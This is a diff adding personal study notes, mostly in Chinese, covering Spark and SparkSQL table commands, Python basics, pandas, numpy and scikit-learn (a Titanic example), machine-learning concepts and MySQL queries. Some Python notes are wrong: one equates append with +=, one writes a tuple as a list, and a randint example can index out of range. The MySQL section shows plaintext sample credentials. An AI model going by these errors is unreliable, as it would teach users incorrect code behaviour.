+    删除：uncache table xx_name;(uncache内存表) 再 drop table xx_name;(drop临时表)(如果单独执行会先uncache再drop)
+
+26. cache table xx_table; (不会创建临时表，因为xx_table本来就存在磁盘中，但查询会查内存表)
+    删除：只能使用uncache table xx_table;来释放内存，如果drop table xx_table;会把原本存放在磁盘中的table删掉。
+    注意：在cache的原始表数据发生变化时，cache表会被释放掉。
+
+27. 
+  1、Compile program
+  $ scalac -classpath "spark-core_2.10-1.3.0.jar:/usr/local/spark/lib/spark-assembly-1.4.0-hadoop2.6.0.jar" SparkWordCount.scala
+
+  2、Create a JAR
+  $ jar -cvf wordcount.jar SparkWordCount*.class spark-core_2.10-1.3.0.jar /usr/local/spark/lib/spark-assembly-1.4.0-hadoop2.6.0.jar
+
+  3、Submit spark application
+  $ spark-submit --class SparkWordCount --master local wordcount.jar
+
+28. 
+
+--------------------------------------Spark End-------------------------------------------
+
+-----------------------------------SparkSQL Begin---------------------------------------
+
+	1.内部表与外部表的转换
+	ALTER TABLE api_poi_grids_info SET TBLPROPERTIES ('EXTERNAL' = 'TRUE');
+
+	2.创建外部表(删去EXTERNAL关键字时，默认为内部表)
+	  CREATE EXTERNAL TABLE test(username String, work string) 
+	  PARTITIONED BY(year String) 
+	  ROW FORMAT DELIMITED FIELDS TERMINATED BY ',' 
+	  LOCATION '/tmp/test/'; 
+
+	3.修改表创建分区
+	ALTER TABLE test ADD PARTITION (year='2010') LOCATION '2010';
+
+	4.删除分区
+	ALTER TABLE test delete PARTITION (year='2010')
+
+	5.上传本地数据到数据表中的分区
+	LOAD DATA LOCAL INPATH '/home/user/logs/log2012-08-14.txt' INTO TABLE databasename.tablename PARTITION(ptdate='2012-08-14');
+
+	6.上传HDFS数据到数据表中的分区
+	LOAD DATA INPATH '/home/user/logs/log2012-08-14.txt' INTO TABLE databasename.tablename PARTITION(ptdate='2012-08-14');
+
+	7. Spark SQL中插入不支持 insert into 表名 values的形式存在.可以 load data local inpath '本地文件路径' into table 表名  [partition(分区字段)]
+		或者 insert  [overwrite,into] table 表名 [partition(分区字段)] select ...from 表名
+		insert into table api_poi_grids_info partition(p_poiid='121212') select * from api_poi_grids_info where p_poiid='spacewalker1452128205517'
+
+	8. Spark SQL中不支持truncate table 表名的形式存在(也包括 delete from 表名)，可通过 hive>dfs -rmr /user/hive/warehouse/表名来清空该表下的数据，以便保持表元数据信息不丢失；或者通过create table 表名 like 表名，也可以。
+
+	9. Spark SQL中join关联查询，只能通过from 表1 join 表2  on (等值的关联条件) ,不支持像mysql或者oracle中，可以from 表1，表2 where 表1.列 = 表2.列的形式
+
+	10. Spark SQL中不支持 in (子查询语句)，比如： in (select id from 表名) .可以通过内连接或者 半连接 from 表1 left  semi join 表2 on （表1.列名 = 表2.列名），表2只能在on中出现，不能在select中引用
+
+	11. //重新构建分区
+		msck repair table api_poi_grids_info;
+    // 显示建表脚本
+    show create table api_poi_grids_info;
+    // 显示某表详细的信息
+    describe formatted api_poi_grids_info;
+
+	12. DROP TABLE IF EXISTS ict_subject_cellagpsmrgrid_do_week;
+		CREATE EXTERNAL TABLE  ict_subject_cellagpsmrgrid_do_week
+		(
+		year int,
+		week int,
+		city string,
+		)
+		PARTITIONED BY (p_provincecode int,p_year int,p_week int)
+		ROW FORMAT DELIMITED FIELDS TERMINATED BY ','
+		STORED AS textfile  
+		LOCATION '/zxvmax/telecom/ict/subject/ict_subject_cellagpsmrgrid_do_week'
+
+		// spark表增加字段
+		alter table lte_netmaxl_nbi_redirect3ganalysis add columns (redirect3gcovertype int);
+
+		// 增加 Partitions 分区
+		alter table ict_subject_othernetappqoe_day add if not exists partition(p_provincecode=510000,p_date='2016-06-17') partition(p_provincecode=510000,p_date='2016-06-02')
+
+	13. 创建表的方式
+		// 默认为 TEXT 格式
+		CREATE TABLE IF NOT EXISTS ed27de5297554a919346139446b050b4 
+		ROW FORMAT DELIMITED FIELDS TERMINATED BY ',' 
+		LOCATION '/spark/api_temptable/ed27de5297554a919346139446b050b4' AS 
+		SELECT * FROM xx_table_name;
+
+		// 新建表为 ORC 格式，下列创建方式从其他表拷贝数据时会报出 org.apache.hadoop.io.Text cannot be cast to org.apache.hadoop.hive.ql.io.orc.OrcSerde$OrcSerdeRow
+		CREATE TABLE 0629_ict_subject_terminal_basic_feature 
+		ROW FORMAT DELIMITED FIELDS TERMINATED BY ','
+		STORED AS INPUTFORMAT 'org.apache.hadoop.hive.ql.io.orc.OrcInputFormat'
+		OUTPUTFORMAT 'org.apache.hadoop.hive.ql.io.orc.OrcOutputFormat' AS
+		select * from ict_subject_terminal_basic_feature limit 100;
+
+		// 新建表格 ORC 格式，可以从 TEXT 格式的表拷贝数据
+		CREATE TABLE 0629_ict_subject_terminal_basic_feature 
+		ROW FORMAT DELIMITED FIELDS TERMINATED BY ','
+		STORED AS ORC AS
+		select * from 0627_ict_subject_terminal_basic_feature;
+
+  14. show functions; //查看Spark SQL中所有的自定义函数
+      select distinct substr(id, 11) from cdma_netmaxc_nbi_exception_cdt_1x_qoe_accessfailurecall where p_date='2016-08-14' and ci = 9404 and serverid = 102815;
+
+  15. add jar /home/mr/UEPositionCaculationUDF.jar;
+      CREATE TEMPORARY FUNCTION uepos_cac AS 'com.cn.zte.vmax.bigdata.lte.UEPositionCaculationUDF';
+      select uepos_cac(millisec,uegid) as Ueposition from lte_cdt_cdte8rnlcreport_enbid_v2 limit 10;
+      DROP TEMPORARY FUNCTION  uepos_cac;
+
+  16. create temporary function customEncrypt as 'com.zte.bigdata.api.udf.customEncrypt';
+
+  17. 查询一个imsi同时对应了3G和4G的情况。 
+  select * from ( select day, imsi, msisdn, terminal_model, count(*) as cc from union_singleuserevaluate_imsimdn_day where p_date='2016-09-22' group by day, imsi, msisdn, terminal_model ) a where cc > 1;
+
+  18. 由于HDFS的设计本身的约束和局限性，使得Hive不支持记录级别的更新、插入或者删除操作，但是用户可以通过查询生成新表或者将查询结果导入到文件中
+
+  19. /opt/ZDH/parcels/bin/spark-sql --extor-cores 6 --total-executor-cores 12 --executor-memory 16g -e "use zxvmax; INSERT OVERWRITE TABLE lte_subject_trafficdensity_grid_hour_temp PARTITION(p_provincecode=30000,p_date='2017-02-12',p_hour) SELECT RegionID,X_Offset,Y_Offset,Round(Max(GridTrafficDuration)/3600.00, 4) AS SumTrafficDur,Hour AS p_hour FROM lte_netmaxl_nbi_covergrid WHERE p_provincecode=500000 AND p_date='2017-02-12' AND GridTrafficDuration IS NOT NULL GROUP BY RegionID,X_Offset,Y_Offset,Hour;" 1>log-debug.txt 2>&1
+
+
+
+------------------------------------SparkSQL End----------------------------------------
+
+--------------------------Python Begin----------------------------
+
+1.以双下划线开头的属性和方法为类(伪)私有的，但可以通过p._person__private_var访问到。
+
+2.操作文件时：推荐使用以下方式，会自动调用close()方法，比较安全。
+	with open/read('xx.file', 'wt/rt') as file:
+		file.write/read()
+  - 若读取的文件内容包含中文，在Python3.x中open()函数需要增加encoding = "utf-8"入参
+    如 with open('xx.file', 'wt/rt', encoding = "utf-8") as data_file:
+
+3.异常处理
+	def divide(x, y):
+    try:
+        result = x / y
+    except ZeroDivisionError: #捕获ZeroDivisionError异常
+        print("division by zero!")
+    else: #try代码块成功执行后执行
+        print("result is", result)
+    finally: #无论如何都会执行
+        print("executing finally clause")
+ 
+4.pip安装
+	a) 到这个网站：https://pypi.python.org/pypi/pip#downloads，下载.tar.gz压缩包
+	b) 进入解压目录，执行：python setup.py install
+	c) 设置环境变量 C:\Python27\Scripts;
+	d) pip --help
+
+5.很多预编译好的widows版本的python模块
+	http://www.lfd.uci.edu/~gohlke/pythonlibs/
+
+6.一句代码启动python HTTP服务器
+	$ cd /home/haoel
+	$ python -m SimpleHTTPServer (python 2.x启动方式) 或者 python -m http.server (python 3.x启动方式)
+
+7.函数参数的形式
+	a)F(arg, arg2, ...)				
+	b)F(arg1, arg2 = value2, ...)	默认参数
+	c)F(*arg1)		变长参数
+	d)F(**arg1)		参数以key=value的形式传入，在函数内会自动展开为字典形式。
+
+8.Decorator  #http://coolshell.cn/articles/11265.html
+	- 示例1
+		@decorator
+		def func():
+    	pass
+    以上代码会被解析为: func = decorator(func)
+
+  - 示例2
+  	@decorator_one
+		@decorator_two
+		def func():
+		    pass
+		以上代码会被解析为: func = decorator_one(decorator_two(func))
+
+	- 示例3
+		@decorator(arg1, arg2)
+		def func():
+		    pass
+		以上代码会被解析为：func = decorator(arg1,arg2)(func) #currying
+
+	- 使用装饰器实现具有缓存作用的求斐波那契数
+	from functools import wraps
+	def memo(fn):
+	    cache = {}
+	    miss = object()
+	 
+	    @wraps(fn) #消去fib()函数被memo函数装饰之后，fib的名字fib.__name__变为memo的副作用
+	    def wrapper(*args):
+	        result = cache.get(args, miss)
+	        if result is miss:
+	            result = fn(*args)
+	            cache[args] = result
+	        return result
+	    return wrapper
+	
+	@memo
+	def fib(n):
+	    if n < 2:
+	        return n
+	    return fib(n - 1) + fib(n - 2)
+
+9.按相反的顺序输出列表的值
+	a = ['one', 'two', 'three']
+	for i in a[::-1]:
+		print i
+
+10. from imp import reload #用于在REPL中重新加载某个模块(.py文件)
+
+11. 列表的sort()函数在Python2.x 和Python3.x中的区别 
+	lst = [(2, person('Peter', 20)), (2, person('Tom', 20))]
+	lst.sort()
+	以上代码在Python3.x中会报错：TypeError: unorderable types: person() < person()
+	而在Python2.x中则不会。
+
+12. z = zip(losses, pl); z.sort()
+	Python2.x, 通过
+	Python3.x, 报错：AttributeError: 'zip' object has no attribute 'sort'
+
+13. Python Shell 改变当前的工作目录
+	import os
+	os.getcwd()
+	os.chdir(r'd:\learnpy')
+
+14. for line in file(filename):
+	Python 3.x 没有file()函数，可以用open()函数代替
+
+15. 为Python Shell添加新的工作路径
+	import sys
+	sys.path.append(r"D:\Python\libsvm-3.21\python")
+
+16. libsvm-3.21版本Python使用例子：
+	from svmutil import *
+	# Specify training set
+	prob = svm_problem([1,-1],[[1,0,1],[-1,0,-1]])
+	# Train the model, 第二个参数详见'svmutil.py'文件
+	m = svm_train(prob, '-t 0 -c 1')
+	# Make a prediction
+	predicted_labels, p_accuracy, p_values = svm_predict([-1],[[1,1,1]],m)
+	# Predicted label for input [1,1,1] is predicted_labels[0]
+	print "Predicted value: " + str(predicted_labels[0])
+
+17. 不换行
+	python 2.x, print 不换行 (加逗号)
+	>>> print x, 
+	python 3.x print 不换行 (加end=''带名参数)
+	>>> print(x, end="")
+
+18. Python3.x中把urllib2、urlparse、和robotparser并入了urllib中，并含有5个子模块。
+	详情请help(urllib).
+	a new urllib package was created. It consists of code from 
+	urllib, urllib2, urlparse, and robotparser. The old 
+	modules have all been removed. The new package has five submodules: 
+	urllib.parse, urllib.request, urllib.response, 
+	urllib.error, and urllib.robotparser. The 
+	urllib.request.urlopen() function uses the url opener from 
+	urllib2. (Note that the unittests have not been renamed for the 
+	beta, but they will be renamed in the future.
+
+19. Beatiful Soup 4 同时支持Python2.6+ 及Python3.x
+	from BeautifulSoup import * 变为 from bs4 import BeautifulSoup
+
+20. 这个在unix类的操作系统才有意义。
+		#!/usr/bin/python是告诉操作系统执行这个脚本的时候，调用/usr/bin下的python解释器；
+		#!/usr/bin/env python这种用法是为了防止操作系统用户没有将python装在默认的/usr/bin路径里。当系统看到这一行的时候，首先会到env设置里查找python的安装路径，再调用对应路径下的解释器程序完成操作。
+		如果不加上以上的内容，需要使用python ./xx.py运行文件；如果加上以上内容，只需要./xx.py就可以运行该文件.
+		另：在windows系统中，不需要这行，但写上总没有错，方便移植到Unix类系统。
+
+21.	TypeError: 'dict_keys' object does not support indexing
+	由于python3改变了dict.keys,返回的是dict_keys对象,支持iterable 但不具备原子特性不支持indexable，我们可以将其明确的转化成list.
+	sides = outcomes.keys()  =>  sides = list(outcomes.keys())  
+
+22.	皮尔逊相关系数
+	https://segmentfault.com/q/1010000000094674
+
+23. Python2.x转换成Python3.x: 
+	python C:\Python27\Tools\Scripts\2to3.py -w .\optimization.py
+
+24. functools.partial就是帮助我们创建一个偏函数的
+	import functools
+	int2 = functools.partial(int, base=2)
+	简单总结functools.partial的作用就是，把一个函数的某些参数给固定住（也就是设置默认值），返回一个新的函数，调用这个新函数会更简单。
+
+25. 随机选取列表中的某个元素
+	- from random import randint
+		[1, 2, 3, 4][randint(0, 4)] #第一个[]是列表的定义，第二个[]是对这个列表选取元素
+
+26. python中类似于三目运算符的表达式
+  - 示例
+  flag = True
+  value = "true" if flag == True else "not true"
+
+27. 给列表中元素排序 http://www.zhihu.com/question/30389643
+  - Python2.x
+    list.sort(cmp=None, key=None, reverse=False) 给列表原地排序，cmp是一个接受两个参数的函数，key则是接受一个参数的函数，reverse控制升降序
+    # 给正式员工按工号升序排序(注意是减号)
+    regular_persons.sort(cmp = lambda x, y: x.job_number - y.job_number)
+  - Python3.x
+    list.sort(key=None, reverse=False) 少了cmp的入参(因为cmp函数会使每个元素都与其他元素对比一次，当元素很多时性能会比较差)
+    # 给正式员工按工号升序排序(注意是减号)
+    # key函数的直接功能就是传入一个元素，返回一个可比较对象。
+    regular_persons.sort(key = lambda x: x.job_number) #根据元素中的job_number排序，实现与以上代码同样的功能
+  - newlist = sorted(list) #sorted函数是内建函数，接受一个序列(列表)，返回有序的副本。
+  - 通过cmp_to_key函数实现cmp功能
+    from functools import cmp_to_key
+    key = cmp_to_key(lambda x,y: int(y+x)-int(x+y))
+    res = ''.join(sorted(map(str, nums), key=key)).lstrip('0')
+
+28. Python中一个中文占3个字符，print("中文"[0:3])，打印「中」字。
+
+29. UnicodeEncodeError: 'ascii' codec can't encode character u'\xa0' in position 20
+  - string.encode(encoding = "utf-8")
+  - string.decode(encoding = "utf-8")
+
+30. import os
+    os.path.join("D:\", "test.txt") # 把多个参数连接成一个路径，注：只连接参数，并不会实际生成这个文件
+    os.mkdir(os.path.join("D:\","test.txt")) # 
+    os.system("mkdir test.txt")
+
+31. def sum_args(*args):
+      return sum(args)
+    调用：sum_args(*[1, 2, 3]) # *号是一个解包动作
+    对比scala
+    def sum_args(args: Int*) = args.sum
+    调用: sum_args(Array(1, 2, 3): _*)
+
+32. int_list = []
+    int_list.append(1)
+    int_list.extend([2, 3, 4])
+
+33. python 运行Shell命令
+	import os
+	result = os.popen('ls | grep enex').read()  # result为运行 ls | grep enex 后返回的结果。
+
+34. list.append("abc") //效率高
+	相当于 list += "abc" 
+
+35. 相关数据结构
+	列表 [1, 2, 3]
+	字典 {"a": 1, "b": 2}
+	集合 {"a", "b", "c"}
+	元组 ["a", "b"]
+
+36. 列表相关
+	list.append("abc") //效率高
+	相当于 list += "abc"
+
+	int_list = []
+    int_list.append(1)
+    int_list.extend([2, 3, 4])
+
+    # 列表选取元素
+	list[a:b:c] #a开始，b结束，每次间隔c；并且a/b/c都可以忽略
+
+37. 字典相关
+	# enumerate函数可以同时输出下标 和 内容
+	animals = ['喵星人', '汪星人', '火星人']
+	for idx, animal in enumerate(animals):
+	    print '#%d: %s' % (idx + 1, animal)
+		
+	# 删除字典中的值
+	del d['key']
+
+	# 若一个list元素很大，如达到上十万个，需要查找某个值是否存在该list中，
+	# 可以采用空间换时间的方式，先把list转换为一个字典，key为list中的值，value为1，
+	# 然后采用该方式获取值：dict.get("value", 0)
+
+	set 和 dict 会对元素进行hash操作，然后存储，因此查找时间为 O(1)
+
+38. 
+
+
+--------------------------Python End----------------------------
+
+--------------------------IPython Begin----------------------------
+
+pandas:
+  1. import pandas as pd #数据分析
+     data_train = pd.read_csv("/Users/Hanxiaoyang/Titanic_data/Train.csv")
+     data_train.info() #得到dataframe中每一列的类型，有数据的行数
+     data_describe() #得到dataframe中每个数值类型列中统计指标，如均值、标准差、最大(小)值以及分位数等
+
+     g = data_train.groupby(['SibSp','Survived']) # 分别根据SibSp和Survived列做groudby分组操作
+     df = pd.DataFrame(g.count()['PassengerId'])
+
+     age_df = df[['Age','Fare', 'Parch', 'SibSp', 'Pclass']] # 取出类型为数值类型的列
+     known_age = age_df[age_df.Age.notnull()].as_matrix() # 取出Age列非空的数据，并转换为矩阵
+     unknown_age = age_df[age_df.Age.isnull()].as_matrix() # 取出Age列为空的数据，并转换为矩阵
+
+     dummies_Cabin = pd.get_dummies(data_train['Cabin'], prefix= 'Cabin') # 对data_train中Cabin列做one-hot编码，新增列前缀为Cabin
+     dummies_Embarked = pd.get_dummies(data_train['Embarked'], prefix= 'Embarked')
+     dummies_Sex = pd.get_dummies(data_train['Sex'], prefix= 'Sex')
+     dummies_Pclass = pd.get_dummies(data_train['Pclass'], prefix= 'Pclass')
+     df = pd.concat([data_train, dummies_Cabin, dummies_Embarked, dummies_Sex, dummies_Pclass], axis=1) # 把通过one-hot编码后新的列拼接到原来的data_train中
+     df.drop(['Pclass', 'Name', 'Sex', 'Ticket', 'Cabin', 'Embarked'], axis=1, inplace=True) # 删除无用的列
+
+     train_df = df.filter(regex='Survived|Age_.*|SibSp|Parch|Fare_.*|Cabin_.*|Embarked_.*|Sex_.*|Pclass_.*') # 利用正则表达式取出对应的列
+     train_np = train_df.as_matrix()
+
+     result.to_csv("/Users/Hanxiaoyang/Titanic_data/logistic_regression_predictions.csv", index=False) # 把类型为dataframe的result结果存为csv格式
+
+     # 输出模型特征与参数，clf为模型变量
+     pd.DataFrame({"columns":list(train_df.columns)[1:], "coef":list(clf.coef_.T)})
+
+     # 数据规整 http://www.jianshu.com/p/b07bc5c650ea
+     concat方法相当于数据库中的全连接(UNION ALL),可以指定按某个轴进行连接,也可以指定连接的方式join(outer,inner 只有这两种)。与数据库不同的时concat不会去重，要达到去重的效果可以使用drop_duplicates方法
+     pd.concat(objs, axis=0, join='outer', join_axes=None, ignore_index=False, keys=None, levels=None, names=None, verify_integrity=False, copy=True)
+
+     join方法提供了一个简便的方法用于将两个DataFrame中的不同的列索引合并成为一个DataFrame
+     pd.join(self, other, on=None, how='left', lsuffix='', rsuffix='', sort=False)
+
+     merge方法可以根据一个或多个键将不同DataFrame中的行连接起来
+     pd.merge(left, right, how='inner', on=None, left_on=None, right_on=None, left_index=False, right_index=False, sort=True, suffixes=('_x', '_y'), copy=True, indicator=False)
+
+     # 创建日期序列，用于dataframe中的index, http://www.cnblogs.com/chaosimple/p/4153083.html
+     dates = pd.date_range('20130101', periods=6)
+     df = pd.DataFrame(np.random.randn(6,4), index=dates, columns=list(ABCD))
+
+     df.loc[行标签,列标签] # 参数可以为整数或者行列名称
+     df.iloc[行位置,列位置] # 参数只能是整数
+
+     df[df['Texas']>=4] # 返回「Texas」列列值大于4的新的DataFrame
+     df.ix[:,df.ix['c']>=4] # 返回「c」行行值大于4的新的DataFrame
+
+2.  # http://www.cnblogs.com/chaosimple/p/4153083.html
+	# http://www.open-open.com/lib/view/open1402477162868.html
+	# 创建日期序列，用于dataframe中的index
+	dates = pd.date_range('20130101', periods=6)
+	df = pd.DataFrame(np.random.randn(6,4), index=dates, columns=list(ABCD))
+
+
+
+
+numpy:
+  import numpy as np
+
+  ndarray数组创建
+  np.array([1, 2, 3, 4])
+  np.arange(5)
+  np.zeros((3, 6))
+  np.ones((3, 6))
+  np.empty((3, 6))
+
+  arr.shape
+  arr.dtype #numpy的数据类型
+  arr.astype(np.float64)
+  arr.reshape((2, 3))
+
+  数组和标量之间的运算
+  1. 相同结构的数据，进行元素级的运算
+  2. 不同结构的，广播后，进行运算
+
+  arr[2] #索引
+  arr[2:4] #切片 是一个视图，任何修改直接反映到原数组上
+  arr[2:4].copy #返回复本，而非视图
+
+  arr2d[0][2] 等价于 arr2d[0, 2]
+
+  布尔型索引
+
+  arr[arr > 0] = 0  # 将arr中的所有负值都设置为0
+
+  花式索引
+  arr = np.arange(32).reshape((8, 4))
+  arr[[1, 5, 7, 2]][:, [0, 3, 1, 2]] # 等价于 arr[np.ix_([1, 5, 7, 2], [0, 3, 1, 2])], 是一个二维的array
+  arr[[1, 5, 7, 2], [0, 3, 1, 2]] # 选出元素(1,0) (5,3) (7,1) (2,2), 是一个一维的array
+
+  arr.T #转置
+  np.dot(arr.T, arr) #点积
+
+  通用函数
+  1. 一元函数
+  2. 二元函数
+
+  条件逻辑元算
+  np.where(cond, xarr, yarr) # if cond is true xarr else yarr
+
+  数组统计方法
+  sum mean std var min max 
+  argmin argmax # 返回最小或最大元素的索引
+  cumsum cumprod # 计算所有元素的累计和或累计积
+
+  arr = np.random.randn(100)
+  (arr > 0).sum() # 统计正值的个数
+  bools = np.array([False, False, True, False])
+  bools.any() # 是否存在True
+  bools.all() # 是否都是True
+
+  arr.sort() # 原地排序，也可以对某个轴进行排序
+  np.sort(arr) # 返回已排序的副本
+
+  集合运算：unique intersect1d union1d in1d setdif1d setxor1d
+  np.unique(arr) # 返回唯一的元素
+
+  文件输入输出
+  np.save('name.npy', arr) # 如果不写.npy后缀，save函数会自动加上。
+  np.load('name.npy')
+  np.loadtxt('array.txt', delimiter=',')
+  np.savetxt('array.txt')
+
+  线性代数运算
+  x.dot(y)
+  numpy.linalg中 diag dot trace det eig inv pinv qr svd solve lstsq
+
+  随机数生成
+  numpy.random中 seed permutation shuffle rand randint randn binomial normal beta chisquare gamma uniform
+  
+
+
+matploylib:
+  1. import matplotlib.pyplot as plt
+     fig = plt.figure()
+     fig.set(alpha=0.2)  # 设定图表颜色alpha参数(设置图像透明度)
+
+     plt.subplot2grid((2,3),(0,0)) # 设置为2行3列，当前编辑为第1行第1列
+     data_train.Survived.value_counts().plot(kind='bar') # 柱状图，取data_train中的「Survived」列，并统计该列中各值的个数，画柱状图
+     plt.title(u"获救情况 (1为获救)") # 标题
+     plt.ylabel(u"人数") #y轴名称
+
+     plt.scatter(data_train.Survived, data_train.Age) # 散点图，plt.scatter(x坐标, y坐标)
+
+     plt.subplot2grid((2,3),(1,0), colspan=2) # 设置为2行3列，当前编辑为第2行第1列，跨度为2列
+     data_train.Age[data_train.Pclass == 1].plot(kind='kde')   
+     data_train.Age[data_train.Pclass == 2].plot(kind='kde')
+     data_train.Age[data_train.Pclass == 3].plot(kind='kde')
+     plt.xlabel(u"年龄")# plots an axis lable
+     plt.ylabel(u"密度") 
+     plt.title(u"各等级的乘客年龄分布")
+     plt.legend((u'头等舱', u'2等舱',u'3等舱'),loc='best') #图例信息 sets our legend for our graph.
+
+     Survived_0 = data_train.Pclass[data_train.Survived == 0].value_counts()
+     Survived_1 = data_train.Pclass[data_train.Survived == 1].value_counts()
+     df=pd.DataFrame({u'获救':Survived_1, u'未获救':Survived_0}) # 构造一个dataframe
+     df.plot(kind='bar', stacked=True) # 根据数据画出柱状图，以堆放的形式
+
+     ax1=fig.add_subplot(141) # 1行4列，当前编辑的为第1个
+     data_train.Survived[data_train.Sex == 'female'][data_train.Pclass != 3].value_counts().plot(kind='bar', label="female highclass", color='#FA2479')
+     ax1.set_xticklabels([u"获救", u"未获救"], rotation=0)
+     ax1.legend([u"女性/高级舱"], loc='best')
+     ax2=fig.add_subplot(142, sharey=ax1) # 1行4列，当前编辑的为第2个，共用ax1的坐标系
+
+
+scikit-learn:
+  1. 交叉验证
+     from sklearn import cross_validation
+     #简单看看打分情况
+     clf = linear_model.LogisticRegression(C=1.0, penalty='l1', tol=1e-6)
+     all_data = df.filter(regex='Survived|Age_.*|SibSp|Parch|Fare_.*|Cabin_.*|Embarked_.*|Sex_.*|Pclass_.*')
+     X = all_data.as_matrix()[:,1:]
+     y = all_data.as_matrix()[:,0]
+     print cross_validation.cross_val_score(clf, X, y, cv=5)
+
+
+
+
+--------------------------IPython End----------------------------
+
+--------------------------ML Begin----------------------------
+
+1. 神经网络
+	激活函数也是神经网络中一个很重要的部分。每一层的网络输出都要经过激活函数。比较常用的有linear，sigmoid，tanh，softmax等。http://blog.csdn.net/niuwei22007/article/details/49208643
+	常用的激活函数
+	- softmax: 在多分类中常用的激活函数，是基于逻辑回归的。
+	- Softplus：softplus(x)=log(1+e^x)，近似生物神经激活函数，最近出现的。
+	- Relu：近似生物神经激活函数，最近出现的。
+	- tanh：双曲正切激活函数，也是很常用的。
+	- sigmoid：S型曲线激活函数，最常用的。
+	- hard_sigmoid：基于S型激活函数。
+	- linear：线性激活函数，最简单的。
+
+2. PageRank http://blog.jobbole.com/23286/
+  - 转移矩阵，rank向量，rank向量更新方程
+  - 解决Dead Ends
+  - 解决Spider Traps
+  - Topic-sensitive PageRank，rank向量更新方程
+
+3. 蒙特卡罗算法：采样越多，越近似最优解；
+   拉斯维加斯算法：采样越多，越有机会找到最优解；
+   - 假如筐里有100个苹果，让我每次闭眼拿1个，挑出最大的。于是我随机拿1个，再随机拿1个跟它比，留下大的，再随机拿1个……我每拿一次，留下的苹果都至少不比上次的小。拿的次数越多，挑出的苹果就越大，但我除非拿100次，否则无法肯定挑出了最大的。这个挑苹果的算法，就属于蒙特卡罗算法——尽量找好的，但不保证是最好的。
+   - 假如有一把锁，给我100把钥匙，只有1把是对的。于是我每次随机拿1把钥匙去试，打不开就再换1把。我试的次数越多，打开（最优解）的机会就越大，但在打开之前，那些错的钥匙都是没有用的。这个试钥匙的算法，就是拉斯维加斯的——尽量找最好的，但不保证能找到。
+
+4. Scala 下的画图工具
+  - libraryDependencies += "org.scalanlp" % "breeze-viz_2.10" % "0.12"
+
+5. Feature Engineering中对于特征缺失的处理
+  - 如果缺值的样本占总数「比例极高」，我们可能就直接「舍弃」了，作为特征加入的话，可能反倒带入noise，影响最后的结果了
+  - 如果缺值的「样本适中」，而该属性「非连续值特征属性」(比如说类目属性)，那就把「NaN」作为一个新类别，加到类别特征中
+  - 如果缺值的「样本适中」，而该属性为「连续值特征属性」，有时候我们会考虑给定一个「step」(比如这里的age，我们可以考虑每隔2/3岁为一个步长)，然后把它离散化，之后把NaN作为一个type加到属性类目中。
+  - 有些情况下，缺失的值个数「并不是特别多」，那我们也可以试着根据已有的值，「拟合」一下数据，补充上。
+
+6. RandomForest是一个用在原始数据中做不同采样，建立多棵Decision Tree，再进行average等等来「降低过拟合现象」，提高结果的机器学习算法
+
+7. 因为逻辑回归建模时，需要输入的特征都是数值型特征，我们通常会先对类目型的特征因子化(把非数值类型的数据使用one-hot编码转换为用数值类型表示)。
+
+8. 如果数值型数据在跨度范围太大，需要对数值数据做scaling。所谓scaling，其实就是将一些变化幅度较大的特征化到[-1,1]之内。
+    import sklearn.preprocessing as preprocessing
+    scaler = preprocessing.StandardScaler()
+    age_scale_param = scaler.fit(df['Age'])
+    df['Age_scaled'] = scaler.fit_transform(df['Age'], age_scale_param)
+    fare_scale_param = scaler.fit(df['Fare'])
+    df['Fare_scaled'] = scaler.fit_transform(df['Fare'], fare_scale_param)
+
+9. 模型融合
+  - 多算法模型融合：利用多个不同的算法(LR、SVM、决策树或神经网络)对数据进行训练，从而得到不同的模型，利用多个模型对测试数据进行拟合。
+  - 单算法模型融合(所谓bagging)：若只有一种算法的情况下，把dataset切分为多个subdataset，对多个subdataset训练得到多个模型，利用多个模型对测试数据进行拟合。
+
+10.『对数据的认识太重要了！』
+   『数据中的特殊点/离群点的分析和处理太重要了！』
+   『特征工程(feature engineering)太重要了！』
+   『模型融合(model ensemble)太重要了！』
+
+11. 得到baseline model
+  - 过拟合(overfitting/high variace)：
+    > 做一下feature selection，挑出较好的feature的subset来做training；
+    > 提供更多的数据，从而弥补原始数据的bias问题，学习到的model也会更准确
+  - 欠拟合(underfitting/high bias)：
+    > 需要更多的feature，更复杂的模型来提高准确度。
+
+12. 时序分析
+	自回归模型（AR）：X的当期值等于一个或数个落后期的线性组合，加常数项，加随机误差。
+	时序分析
+		平稳：围绕着一个常数上下波动
+		解决不平稳：差分（1阶、2阶、3阶..等，直到序列平稳）
+		针对平稳的检验：ADF单位根平稳型检验
+		
+		截尾：在某阶之后，系数都为0（或很接近0）
+		拖尾：有一个衰减的趋势，但是不都为0 
+		
+		如果自相关是拖尾，偏相关截尾，则用 AR 算法
+		如果自相关截尾，偏相关拖尾，则用 MA 算法
+		如果自相关和偏相关都是拖尾，则用 ARMA 算法， ARIMA 是 ARMA 算法的扩展版，用法类似。
+		
+		自相关函数是描述随机信号X(t)在任意两个不同时刻t1，t2的取值之间的相关程度
+		
+		当我们用ARIMA模型去拟合数据时，拟合后我们要对残差的估计序列进行LB检验，判断其是否是高斯白噪声，如果不是，那么就说明ARIMA模型也许并不是一个适合样本的模型。
+
+13. LDA
+	https://rstudio-pubs-static.s3.amazonaws.com/79360_850b2a69980c4488b1db95987a24867a.html
+	http://www.tuicool.com/articles/reaIra6
+
+
+
+--------------------------ML End------------------------------
+ 
+-----------------------MySQL Begin-------------------------
+
+1. 连接：mysql -h 10.9.233.94 -u root -pxxx
+  启动：/etc/rc.d/init.d/mysql start
+
+  查看mysql的当前所有连接的详细资料：mysqladmin -uroot -proot123 -h127.0.0.1 -P3310 processlist
+  只查看当前连接数(Threads就是连接数.): mysqladmin -uroot -proot123 -h127.0.0.1 -P3310 status
+
+2. 执行sql文件：source /home/import_data.sql
+
+3. SQL语句执行顺序
+	- 先where 后select 
+	- 先where 再group 再having 后select 
+	- 先where 再group 再having 再select 后order 
+	- 先join  再where 后select 
+
+4. 统计一个有重复记录的查询结果中重复的条数
+  - 示例
+  用户表
+    userid    company
+    1          A
+    2          B
+    3          C
+  卡表
+    id  usrid   usrname  
+    1      1     zhang
+    2      1     wang
+    3      3     zhao
+    4      3     sun
+    5      2     li
+  想要的结果
+    usrid       company   doubleCount(重复的公司个数）
+    1             A          2
+    2             B          1
+    3             C          2
+  查询语句为：
+    SELECT B.usrid,A.company,COUNT(1) AS doubleCount
+    FROM 用户表 AS A,卡表 AS B
+    WHERE A.userid = B.usrid 
+    GROUP BY B.usrid,company
+  其中注意 COUNT(1) 的使用，以及别忘了 GROUP BY
+
+5. IFNULL(exp1, exp2), 如果exp1为NULL, 用exp2替代返回
+   MAX(time), 可以取时间最大的数据项 
